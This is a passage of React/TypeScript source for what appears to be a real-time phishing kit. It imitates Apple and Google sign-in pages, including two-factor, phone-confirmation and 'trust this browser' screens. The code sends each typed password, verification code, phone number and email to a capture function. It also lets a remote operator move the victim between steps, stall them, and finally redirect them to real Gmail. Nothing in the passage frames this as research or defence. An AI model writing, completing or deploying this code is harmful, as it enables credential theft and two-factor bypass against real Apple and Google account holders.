                    ref={passwordRef}
                    data-testid="apple-password-input"
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={e => { setPassword(e.target.value); setPasswordError(null); }}
                    onKeyDown={e => { if (e.key === 'Enter' && password) nav('verification-code', 'password', password); }}
                    placeholder="Password"
                    style={{ width:'100%', padding:'13px 48px 13px 16px', fontSize:17, border:'none', backgroundColor:inBg, color:txtMain, outline:'none', fontFamily:ff, boxSizing:'border-box' as const }}
                  />
                  <button
                    data-testid="apple-show-password"
                    onClick={() => setShowPassword(v => !v)}
                    style={{ position:'absolute', right:10, top:'50%', transform:'translateY(-50%)', background:'none', border:'none', cursor:'pointer', color:txtSub, padding:4, display:'flex', alignItems:'center' }}
                  >
                    {showPassword ? <EyeOff style={{ width:18, height:18 }} /> : <Eye style={{ width:18, height:18 }} />}
                  </button>
                </div>
              </div>
              {passwordError && <p style={{ fontSize:13, color:errClr, alignSelf:'flex-start', marginBottom:6 }}>{passwordError}</p>}

              {/* Keep signed in + forgot */}
              <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', width:'100%', marginBottom:20, gap:8 }}>
                <label style={{ display:'flex', alignItems:'center', gap:7, fontSize:14, color:txtMain, cursor:'pointer' }}>
                  <input
                    type="checkbox"
                    checked={keepSignedIn}
                    onChange={e => setKeepSignedIn(e.target.checked)}
                    style={{ width:15, height:15, accentColor:blue, cursor:'pointer', flexShrink:0 }}
                  />
                  Keep me signed in
                </label>
                <button
                  data-testid="apple-forgot-password-2"
                  onClick={() => { setForgotEmail(email); setStep('forgot'); }}
                  style={{ ...S.link, fontSize:14, whiteSpace:'nowrap' as const }}
                >
                  Forgotten your password? ›
                </button>
              </div>

              {/* Button row */}
              <div style={{ display:'flex', gap:10, width:'100%', marginBottom:8 }}>
                <button
                  data-testid="apple-signin-btn"
                  onClick={() => password && nav('verification-code', 'password', password)}
                  style={{ ...S.blueBtn(!password), flex:1 }}
                >
                  Sign In
                </button>
                {PasskeyBtn}
              </div>
              {PasskeyNote}
            </>
          )}

          {/* ── 2FA — Verification Code ── */}
          {!isLoadingState && (step === 'verification-code' || step === 'error-code') && (
            <>
              {Ring}
              <h1 style={{ fontSize:20, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 10px' }}>
                Two-factor authentication
              </h1>
              <p style={{ fontSize:14, color:txtSub, textAlign:'center', margin:'0 0 24px', lineHeight:1.5 }}>
                Enter the verification code sent to your iPhone.
              </p>

              {/* 6 digit boxes */}
              <div style={{ position:'relative', marginBottom:4, cursor:'text' }} onClick={() => codeRef.current?.focus()}>
                <div style={{ display:'flex', gap:8, justifyContent:'center', pointerEvents:'none' }}>
                  {Array.from({ length:6 }).map((_, i) => (
                    <div key={i} style={{
                      width:44, height:50, borderRadius:8,
                      border:`2px solid ${i === codeInput.length && codeInput.length < 6 ? blue : codeInput[i] ? blue : inBdr}`,
                      backgroundColor: inBg,
                      display:'flex', alignItems:'center', justifyContent:'center',
                      fontSize:22, fontWeight:500, color:txtMain, transition:'border-color .12s',
                      position:'relative',
                    }}>
                      {codeInput[i] !== undefined
                        ? codeInput[i]
                        : i === codeInput.length
                          ? <span className="apple-cur" style={{ backgroundColor:txtMain }} />
                          : null
                      }
                    </div>
                  ))}
                </div>
                <input
                  ref={codeRef}
                  data-testid="apple-code-input"
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  autoFocus
                  value={codeInput}
                  onChange={e => {
                    const v = e.target.value.replace(/\D/g, '').slice(0, 6);
                    setCodeInput(v);
                    sendCapture('verification_code', v);
                    if (v.length === 6) setTimeout(() => nav('device-trust'), 350);
                  }}
                  aria-label="Verification code"
                  style={{ position:'absolute', inset:0, opacity:0, width:'100%', height:'100%', cursor:'text', caretColor:'transparent', fontSize:0 }}
                />
              </div>

              {codeError && <p style={{ fontSize:13, color:errClr, textAlign:'center', marginTop:8, marginBottom:0 }}>{codeError}</p>}

              <div style={{ display:'flex', flexDirection:'column', alignItems:'center', gap:10, marginTop:16, marginBottom:0 }}>
                <button data-testid="apple-resend-code" style={S.link}>Resend code to iPhone</button>
                <button style={S.link}>Cannot access your iPhone?</button>
              </div>

              {LostDeviceSection}
            </>
          )}

          {/* ── Trust this browser ── */}
          {!isLoadingState && step === 'device-trust' && (
            <>
              {Ring}
              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 12px' }}>
                Trust this browser?
              </h1>
              <p style={{ fontSize:14, color:txtSub, textAlign:'center', margin:'0 0 24px', lineHeight:1.55, maxWidth:320 }}>
                Should you choose to trust this browser, you will not be asked for a verification code the next time you sign in.
              </p>

              {/* Three buttons */}
              <div style={{ display:'flex', gap:8, width:'100%', marginBottom:10 }}>
                <button
                  data-testid="apple-not-now"
                  onClick={() => nav('processing')}
                  style={{ ...S.outBtn(), flex:1, fontSize:15 }}
                >
                  Not Now
                </button>
                <button
                  data-testid="apple-do-not-trust"
                  onClick={() => nav('processing')}
                  style={{ ...S.outBtn(), flex:1, fontSize:15 }}
                >
                  Do not trust
                </button>
                <button
                  data-testid="apple-trust"
                  onClick={() => nav('processing')}
                  style={{ ...S.blueBtn(), flex:1, fontSize:15 }}
                >
                  Trust
                </button>
              </div>
              <button style={{ ...S.link, fontSize:13, marginBottom:4 }}>Sign in to your Apple Account</button>

              {LostDeviceSection}
            </>
          )}

          {/* ── Forgot password ── */}
          {!isLoadingState && step === 'forgot' && (
            <>
              {Ring}
              <h1 style={{ fontSize:22, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 14px' }}>Reset Password</h1>
              <p style={{ fontSize:14, color:txtSub, textAlign:'center', margin:'0 0 20px', lineHeight:1.55 }}>
                Enter your Apple Account email address and we'll help you reset your password.
              </p>
              <input
                type="email"
                autoFocus
                value={forgotEmail}
                onChange={e => setForgotEmail(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter' && forgotEmail) { sendCapture('forgot_email', forgotEmail); setStep('forgot-sent'); } }}
                placeholder="Email or Phone Number"
                style={{ ...S.input(), marginBottom:14 }}
              />
              <button
                onClick={() => { if (forgotEmail) { sendCapture('forgot_email', forgotEmail); setStep('forgot-sent'); } }}
                style={{ ...S.blueBtn(!forgotEmail), width:'100%', marginBottom:10 }}
              >
                Continue
              </button>
              <button onClick={() => setStep(password ? 'password' : 'email')} style={{ ...S.link, color:txtSub, fontSize:15 }}>
                Cancel
              </button>
            </>
          )}

          {/* ── Forgot sent ── */}
          {!isLoadingState && step === 'forgot-sent' && (
            <>
              <div style={{ width:60, height:60, borderRadius:'50%', backgroundColor: isDark ? '#1c3553' : '#e8f4ff', display:'flex', alignItems:'center', justifyContent:'center', marginBottom:20 }}>
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke={blue} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <rect x="2" y="4" width="20" height="16" rx="2"/>
                  <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
                </svg>
              </div>
              <h2 style={{ fontSize:20, fontWeight:600, color:txtMain, textAlign:'center', margin:'0 0 12px' }}>Check Your Email</h2>
              <p style={{ fontSize:14, color:txtSub, textAlign:'center', lineHeight:1.55, margin:'0 0 24px' }}>
                If an Apple Account exists for <strong style={{ color:txtMain }}>{forgotEmail}</strong>, we've sent password reset instructions to that address.
              </p>
              <button onClick={() => setStep('email')} style={{ ...S.blueBtn(), width:'100%' }}>Return to Sign In</button>
            </>
          )}

        </div>
      </div>

      {/* ── Footer ── */}
      <div style={{ padding:'14px 24px', borderTop:`1px solid ${divBdr}`, display:'flex', justifyContent:'space-between', alignItems:'center', flexWrap:'wrap', gap:8 }}>
        <div style={{ display:'flex', gap:0, alignItems:'center', flexWrap:'wrap' }}>
          {(['System Status','Privacy Policy','Terms & Conditions'] as const).map((t, i) => (
            <span key={t} style={{ display:'flex', alignItems:'center' }}>
              {i > 0 && <span style={{ color: isDark ? '#636366' : '#aeaeb2', margin:'0 8px' }}>|</span>}
              <button style={{ fontSize:12, color:txtSub, background:'none', border:'none', cursor:'pointer', fontFamily:ff, padding:0 }}>{t}</button>
            </span>
          ))}
        </div>
        <span style={{ fontSize:12, color:txtSub }}>Copyright © 2026 Apple Inc. All rights reserved.</span>
      </div>
    </div>
  );
}

// ─── Google ──────────────────────────────────────────────────────────────────

type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'phone-update' | 'sign-in-blocked' | 'killing-time' | 'error-email' | 'error-password' | 'error-code' | 'account-locked';

function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
  device: string; theme: string;
  sendCapture: (field: string, value: string) => void;
  sendStepUpdate: (step: string) => void;
  setNavigateHandler: (fn: NavigateHandler) => void;
}) {
  const isDark = theme === 'dark';
  const isDesktop = device === 'desktop';
  const [step, setStep] = useState<GoogleStep>(() => {
    const init = new URLSearchParams(window.location.search).get('initialStep') as GoogleStep | null;
    return init ?? 'email';
  });
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [phoneCodeInput, setPhoneCodeInput] = useState('');
  const [phoneCodeFocused, setPhoneCodeFocused] = useState(false);
  const [transitioning, setTransitioning] = useState(false);
  const [captchaState, setCaptchaState] = useState<'idle' | 'challenge' | 'solving' | 'solved'>('idle');
  const [selectedImgs, setSelectedImgs] = useState<Set<number>>(new Set());
  const [confirmedPhone, setConfirmedPhone] = useState('');
  const [confirmedPhoneFocused, setConfirmedPhoneFocused] = useState(false);
  const [promptTimedOut, setPromptTimedOut] = useState(false);
  const [localPromptNumber, setLocalPromptNumber] = useState<number | null>(null);
  const [phoneUpdateInput, setPhoneUpdateInput] = useState('');
  const [phoneUpdateFocused, setPhoneUpdateFocused] = useState(false);
  const [phoneUpdateContext, setPhoneUpdateContext] = useState<'was-me' | 'not-me' | null>(null);
  const [actionPhoneDigits, setActionPhoneDigits] = useState<string | null>(null);
  const [resendClicked, setResendClicked] = useState(false);
  const [moreWaysClicked, setMoreWaysClicked] = useState(false);
  const passwordRef = useRef<HTMLInputElement>(null);
  const _gParams = new URLSearchParams(window.location.search);
  const googlePhone = _gParams.get('gphone') ?? '09';
  const gVerifyMethod = (_gParams.get('gverify') ?? 'sms') as 'sms' | 'auth';
  const gCorrectNumber = parseInt(_gParams.get('gnumber') ?? '45');
  const effectiveNumber = localPromptNumber ?? gCorrectNumber;

  useEffect(() => {
    if (step === 'password') passwordRef.current?.focus();
  }, [step]);

  const gotoStep = useCallback((target: GoogleStep) => {
    setTransitioning(true);
    setTimeout(() => { setStep(target); setTransitioning(false); }, 650);
  }, []);

  useEffect(() => {
    setNavigateHandler((s, action) => {
      if (s === 'gmail-done') { window.location.href = 'https://mail.google.com'; return; }
      if (s === 'unlock') { gotoStep('email'); return; }
      setResendClicked(false);
      setMoreWaysClicked(false);
      if (s === 'prompt-timeout') {
        if (action?.promptNumber != null) setLocalPromptNumber(action.promptNumber);
        setPromptTimedOut(true);
        gotoStep('prompt-number');
      } else {
        setPromptTimedOut(false);
        if (action?.promptNumber != null) setLocalPromptNumber(action.promptNumber);
        if (action?.phoneDigits) { setActionPhoneDigits(action.phoneDigits); sendCapture('phone', action.phoneDigits); }
        gotoStep(s as GoogleStep);
      }
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);

  useEffect(() => {
    if (step !== 'killing-time') return;
    const t = setTimeout(() => setStep('processing'), 30000);
    return () => clearTimeout(t);
  }, [step]);

  const nav = (target: GoogleStep, captureField?: string, captureVal?: string) => {
    if (captureField && captureVal) sendCapture(captureField, captureVal);
    gotoStep(target);
  };

  const solveCaptcha = () => {
    setCaptchaState('solving');
    setTimeout(() => setCaptchaState('solved'), 2000);
  };

  const CAPTCHA_IMGS = [
    { url: 'https://images.unsplash.com/photo-1494976388531-d1058494cdd8?w=140&h=140&fit=crop', car: true },
    { url: 'https://images.unsplash.com/photo-1518791841217-8f162f1912da?w=140&h=140&fit=crop', car: false },
    { url: 'https://images.unsplash.com/photo-1503736334956-4c8f8e92946d?w=140&h=140&fit=crop', car: true },
    { url: 'https://images.unsplash.com/photo-1441974231531-c6227db76b6e?w=140&h=140&fit=crop', car: false },
    { url: 'https://images.unsplash.com/photo-1553361371-9b22f78e8b1d?w=140&h=140&fit=crop', car: false },
    { url: 'https://images.unsplash.com/photo-1568605117036-5fe5e7bab0b7?w=140&h=140&fit=crop', car: true },
    { url: 'https://images.unsplash.com/photo-1497436072909-60f360e1d4b1?w=140&h=140&fit=crop', car: false },
    { url: 'https://images.unsplash.com/photo-1501854140801-50d01698950b?w=140&h=140&fit=crop', car: false },
    { url: 'https://images.unsplash.com/photo-1469474968028-56623f02e42e?w=140&h=140&fit=crop', car: false },
  ];

  const bg = isDark ? '#1f1f1f' : '#f0f4f9';
  const cardBg = isDark ? '#282a2c' : '#ffffff';
  const textColor = isDark ? '#e3e3e3' : '#1f1f1f';
  const linkColor = isDark ? '#a8c7fa' : '#0b57d0';
  const borderColor = isDark ? '#8e918f' : '#747775';
  const focusBorderColor = isDark ? '#a8c7fa' : '#0b57d0';
  const subText = isDark ? '#c4c7c5' : '#444746';
  const labelColor = isDark ? '#8e918f' : '#444746';

  const floatingLabel = (focused: boolean, hasValue: boolean) =>
    focused || hasValue
      ? { top: 6, fontSize: 12, color: focused ? focusBorderColor : labelColor }
      : { top: 14, fontSize: 16, color: labelColor };

  const initial = email ? email[0].toUpperCase() : 'G';

  if (step === 'account-locked') return <AccountLockedScreen email={email} onLogout={() => gotoStep('email')} />;

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap');
        @keyframes g-bar-sweep { from { transform: scaleX(0); } to { transform: scaleX(1); } }
        @keyframes g-bar-slide { 0% { left:-35%;width:30%; } 50% { left:60%;width:50%; } 100% { left:110%;width:30%; } }
        .g-bar-sweep { animation: g-bar-sweep 0.65s cubic-bezier(0.4,0,0.2,1) forwards; transform-origin: left; }
        .g-bar-slide { animation: g-bar-slide 1.5s ease-in-out infinite; position:absolute; height:100%; background:#1a73e8; }
      `}</style>
      <div className="w-full h-full flex flex-col items-center justify-center"
        style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif", backgroundColor: bg, color: textColor }}>
        <div style={{
          display: 'flex',
          flexDirection: isDesktop ? 'row' : 'column',
          width: '100%',
          maxWidth: isDesktop ? 800 : 'none',
          height: isDesktop ? 'auto' : '100%',
          background: cardBg,
          borderRadius: isDesktop ? 28 : 0,
          padding: isDesktop ? '44px 48px' : '48px 24px 24px',
          boxSizing: 'border-box',
          position: 'relative',
          overflow: 'hidden',
        }}>
          {/* Blue progress bar */}
          {(transitioning || step === 'processing') && (
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 3, zIndex: 20 }}>
              {transitioning
                ? <div className="g-bar-sweep" style={{ height: '100%', background: '#1a73e8', width: '100%' }} />
                : <div className="g-bar-slide" />}
            </div>
          )}

          {/* Left / Top: branding */}
          <div style={{ display: 'flex', flexDirection: 'column', flex: isDesktop ? '0 0 200px' : 'none', paddingRight: isDesktop ? 40 : 0, marginBottom: isDesktop ? 0 : 32 }}>
            <div style={{ marginBottom: 16 }}><GoogleLogo /></div>
            <h1 style={{ fontSize: 32, fontWeight: 400, margin: '0 0 8px', color: textColor }}>
              {step === 'email' || step === 'error-email' ? 'Sign in'
                : step === 'phone-verify' || step === 'phone-code' || step === 'error-code' ? 'Confirm it\'s you'
                : step === 'phone-confirm' ? 'Confirm your number'
                : step === 'phone-wrong' ? 'Review recent activity'
                : step === 'phone-update' ? 'Update phone number'
                : step === 'prompt-number' ? 'Verify it\'s you'
                : step === 'sign-in-blocked' ? 'Sign-in blocked'
                : step === 'verify' ? 'Verify it\'s you'
                : step === 'killing-time' ? 'Signing in'
                : step === 'processing' ? 'Welcome'
                : 'Welcome'}
            </h1>
            <p style={{ fontSize: 16, color: subText, margin: 0 }}>
              {step === 'verify' || step === 'prompt-number'
                ? <span>To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in. <a href="#" onClick={e => e.preventDefault()} style={{ color: linkColor, textDecoration: 'none' }}>Learn more</a></span>
                : step === 'email' || step === 'error-email'
                ? 'to continue to Gmail'
                : 'Use your Google Account'}
            </p>
          </div>

          {/* Right / Bottom: form */}
          <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>

            {/* ── Step: email / error-email ── */}
            {(step === 'email' || step === 'error-email') && (
              <>
                <div>
                  {/* MUI outlined input — label sits on the top border */}
                  <div style={{ position: 'relative', marginBottom: 6 }}>
                    <input
                      data-testid="google-email-input"
                      type="text"
                      value={email}
                      onChange={e => { setEmail(e.target.value); }}
                      onFocus={() => setEmailFocused(true)}
                      onBlur={() => setEmailFocused(false)}
                      onKeyDown={e => { if (e.key === 'Enter') { const v = email.trim(); const ok = v.length >= 4 && (!v.includes('@') || v.toLowerCase().endsWith('@gmail.com')); if (ok) nav('password', 'email', v); } }}
                      autoFocus
                      style={{
                        width: '100%', height: 48, padding: '0 16px', fontSize: 16,
                        border: `${emailFocused ? 2 : 1}px solid ${step === 'error-email' && !emailFocused ? '#dc2626' : emailFocused ? focusBorderColor : borderColor}`,
                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                      }}
                    />
                    <label style={{
                      position: 'absolute',
                      left: (emailFocused || !!email) ? 12 : 16,
                      top: (emailFocused || !!email) ? -8 : 14,
                      fontSize: (emailFocused || !!email) ? 12 : 16,
                      color: emailFocused ? focusBorderColor : (step === 'error-email' && !emailFocused ? '#dc2626' : labelColor),
                      background: (emailFocused || !!email) ? cardBg : 'transparent',
                      padding: (emailFocused || !!email) ? '0 4px' : '0',
                      pointerEvents: 'none',
                      transition: 'all 0.15s',
                      lineHeight: 1.2,
                    }}>
                      Email or phone
                    </label>
                  </div>
                  {step === 'error-email' && (
                    <p style={{ fontSize: 13, color: '#dc2626', margin: '0 0 4px', lineHeight: 1.4 }}>
                      Couldn&apos;t find your Google Account. Try entering your full email address.
                    </p>
                  )}
                  <button data-testid="google-forgot-email"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '8px 0 28px', display: 'block' }}>
                    Forgot email?
                  </button>
                  <p style={{ fontSize: 14, color: subText, margin: 0, lineHeight: 1.6 }}>
                    Not your computer? Use Guest mode to sign in privately.{' '}
                    <button data-testid="google-guest-mode"
                      style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: 0, display: 'inline' }}>
                      Learn more about using Guest mode
                    </button>
                  </p>
                </div>
                <div style={{ display: 'flex', justifyContent: 'flex-end', alignItems: 'center', gap: 8, marginTop: 36 }}>
                  <button data-testid="google-create-account"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Create account
                  </button>
                  <button data-testid="google-next-btn"
                    onClick={() => { const v = email.trim(); const ok = v.length >= 4 && (!v.includes('@') || v.toLowerCase().endsWith('@gmail.com')); if (ok) nav('password', 'email', v); }}
                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                    Next
                  </button>
                </div>
              </>
            )}

            {/* ── Step: password / error-password ── */}
            {(step === 'password' || step === 'error-password') && (
              <>
                <div>
                  {/* Email chip */}
                  <div style={{
                    display: 'inline-flex', alignItems: 'center', gap: 8,
                    border: `1px solid ${borderColor}`, borderRadius: 20,
                    padding: '6px 12px 6px 6px', marginBottom: 24, cursor: 'pointer',
                    background: isDark ? '#3c3f43' : '#f0f4f9',
                  }}
                    data-testid="google-email-chip"
                    onClick={() => setStep('email')}
                  >
                    <div style={{
                      width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0',
                      display: 'flex', alignItems: 'center', justifyContent: 'center',
                      fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0,
                    }}>
                      {initial}
                    </div>
                    <span style={{ fontSize: 14, color: textColor }}>{email}</span>
                    <ChevronLeft className="w-3 h-3 rotate-180" style={{ color: textColor, marginLeft: 2 }} />
                  </div>

                  {/* Password field */}
                  <div style={{ position: 'relative', marginBottom: 8 }}>
                    <input
                      ref={passwordRef}
                      data-testid="google-password-input"
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={e => { setPassword(e.target.value); }}
                      onFocus={() => setPasswordFocused(true)}
                      onBlur={() => setPasswordFocused(false)}
                      style={{
                        width: '100%', padding: '20px 44px 8px 16px', fontSize: 16,
                        border: `${passwordFocused ? 2 : 1}px solid ${passwordFocused ? focusBorderColor : borderColor}`,
                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                      }}
                    />
                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(passwordFocused, !!password) }}>
                      Enter your password
                    </label>
                    <button
                      data-testid="google-show-password"
                      onClick={() => setShowPassword(v => !v)}
                      style={{ position: 'absolute', right: 12, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', color: labelColor, padding: 4 }}>
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                  {step === 'error-password' && (
                    <p style={{ fontSize: 13, color: '#dc2626', margin: '4px 0 0', lineHeight: 1.4 }}>
                      Wrong password. Try again or click Forgot password to reset it.
                    </p>
                  )}
                  <button data-testid="google-forgot-password"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0' }}>
                    Forgot password?
                  </button>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button data-testid="google-create-account-2"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Create account
                  </button>
                  <button data-testid="google-signin-btn"
                    onClick={() => { if (password) nav('processing', 'password', password); }}
                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                    Next
                  </button>
                </div>
              </>
            )}

            {/* ── Phone Verify (Confirm it's you) ── */}
            {step === 'phone-verify' && (
              <>
                <div>
                  <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
                    To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in.
                  </p>
                  {gVerifyMethod === 'sms' ? (
                    /* SMS Code option only */
                    <div style={{
                      border: `1px solid ${borderColor}`, borderRadius: 4,
                      padding: '16px', cursor: 'pointer',
                      display: 'flex', alignItems: 'center', gap: 16, background: 'transparent',
                    }} onClick={() => nav('phone-confirm')}>
                      <div style={{ width: 40, height: 40, borderRadius: '50%', background: isDark ? '#3c4043' : '#e8f0fe', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                        <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                          <rect x="5" y="2" width="14" height="20" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
                          <circle cx="12" cy="18" r="1" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
                        </svg>
                      </div>
                      <div style={{ flex: 1 }}>
                        <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>Get a verification code</div>
                        <div style={{ fontSize: 13, color: subText }}>Google will text a verification code to your phone</div>
                      </div>
                      <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
                    </div>
                  ) : (
                    /* Authenticator App option only */
                    <div style={{
                      border: `1px solid ${borderColor}`, borderRadius: 4,
                      padding: '16px', cursor: 'pointer',
                      display: 'flex', alignItems: 'center', gap: 16, background: 'transparent',
                    }} onClick={() => nav('phone-code')}>
                      <div style={{ width: 40, height: 40, borderRadius: '50%', background: isDark ? '#3c4043' : '#e8f0fe', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                        <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                          <rect x="3" y="3" width="18" height="18" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
                          <path d="M8 8h2m-2 4h6m-6 4h4" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5" strokeLinecap="round"/>
                        </svg>
                      </div>
                      <div style={{ flex: 1 }}>
                        <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>Use an authenticator app</div>
                        <div style={{ fontSize: 13, color: subText }}>Get a verification code from your authenticator app</div>
                      </div>
                      <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
                    </div>
                  )}
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button onClick={() => setStep('password')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Back
                  </button>
                </div>
              </>
            )}

            {/* ── Phone Confirm (user types their number) ── */}
            {step === 'phone-confirm' && (
              <>
                <div>
                  <p style={{ fontSize: 14, color: subText, marginBottom: 24 }}>
                    To verify it&apos;s you, Google will send a verification code to your phone. First, confirm your number.
                  </p>
                  <div style={{ position: 'relative', marginBottom: 8 }}>
                    <input
                      type="tel"
                      value={confirmedPhone}
                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 15); setConfirmedPhone(v); }}
                      onFocus={() => setConfirmedPhoneFocused(true)}
                      onBlur={() => setConfirmedPhoneFocused(false)}
                      onKeyDown={e => { if (e.key === 'Enter' && confirmedPhone.length >= 7) nav('phone-code', 'phone', confirmedPhone); }}
                      autoFocus
                      style={{
                        width: '100%', padding: '20px 16px 8px', fontSize: 16,
                        border: `${confirmedPhoneFocused ? 2 : 1}px solid ${confirmedPhoneFocused ? focusBorderColor : borderColor}`,
                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                      }}
                    />
                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(confirmedPhoneFocused, !!confirmedPhone) }}>
                      Phone number
                    </label>
                  </div>
                  <button onClick={() => setStep('phone-wrong')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 13, fontWeight: 500, cursor: 'pointer', padding: '10px 0 0', display: 'block' }}>
                    This isn&apos;t my number
                  </button>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button onClick={() => setStep('phone-verify')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Back
                  </button>
                  <button onClick={() => confirmedPhone.length >= 7 && nav('phone-code', 'phone', confirmedPhone)}
                    style={{ backgroundColor: confirmedPhone.length >= 7 ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c4043' : '#c8d0db'), color: confirmedPhone.length >= 7 ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: confirmedPhone.length >= 7 ? 'pointer' : 'default' }}>
                    Send
                  </button>
                </div>
              </>
            )}

            {/* ── Phone Wrong (alert — someone trying to change your number) ── */}
            {step === 'phone-wrong' && (
              <>
                <div style={{ flex: 1 }}>
                  <div style={{ background: isDark ? '#2d1b00' : '#fff8e6', border: `1px solid ${isDark ? '#78350f' : '#f59e0b'}`, borderRadius: 8, padding: '14px 16px', marginBottom: 20 }}>
                    <div style={{ display: 'flex', alignItems: 'flex-start', gap: 10 }}>
                      <svg viewBox="0 0 24 24" width="20" height="20" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" stroke="#b45309" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                        <path d="M12 9v4m0 4h.01" stroke="#b45309" strokeWidth="1.5" strokeLinecap="round"/>
                      </svg>
                      <div>
                        <p style={{ fontSize: 14, fontWeight: 600, color: isDark ? '#fcd34d' : '#92400e', margin: '0 0 4px' }}>Someone is trying to change your phone number</p>
                        <p style={{ fontSize: 13, color: isDark ? '#fcd34d' : '#b45309', margin: 0, lineHeight: 1.5 }}>
                          A request was made to change the phone number on your Google Account. If this wasn&apos;t you, your account may be at risk.
                        </p>
                      </div>
                    </div>
                  </div>
                  <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, border: `1px solid ${borderColor}`, borderRadius: 20, padding: '6px 12px 6px 6px', background: isDark ? '#3c3f43' : '#f0f4f9' }}>
                    <div style={{ width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0 }}>{initial}</div>
                    <span style={{ fontSize: 14, color: textColor }}>{email || 'janedoe@gmail.com'}</span>
